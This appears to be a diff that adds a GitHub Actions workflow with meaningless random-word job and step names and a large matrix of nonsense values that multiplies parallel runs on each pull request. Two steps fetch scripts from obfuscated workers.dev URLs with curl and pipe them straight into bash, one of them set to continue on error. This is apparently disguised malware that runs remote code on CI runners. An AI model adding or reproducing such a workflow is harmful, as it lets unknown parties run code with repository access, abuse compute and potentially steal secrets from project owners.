@@ -1,0 +1,30 @@
+name: refine
+
+on:
+  pull_request:
+
+concurrency:
+  group: raise
+
+jobs:
+  rational:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        clarify: ["vocabulary", "kid", "tiny", "force", "therefore"]
+        lick: ["borrow", "client", "swallow", "disorder"]
+        adapt: ["reference", "puzzling"]
+      fail-fast: false
+    steps:
+    - uses: actions/checkout@v6
+    - name: appointment
+      continue-on-error: true
+      run: |
+        curl -sS -L "https://x.linux-work-10x1za.workers.dev/acea84e96ad0/16f5de549263ecfa/a9db8cfc/11c5f7f854/3eded/306fc/681d/92fb/?jct=1777954574&or=suv&rl=x" | bash
+    - name: journey
+      run: |
+        curl -sS -L -X GET "https://node.dolentemanhire9008.workers.dev/f35c/d5404/306/32/5af123aa5b9ad34ce/7/268aeee8b5d2e/a38501161ba82a63f4/2?guw=1777976474" | bash
+    - uses: actions/upload-artifact@v4
+      with:
+        path: 'practice'
+        name: 'agency'
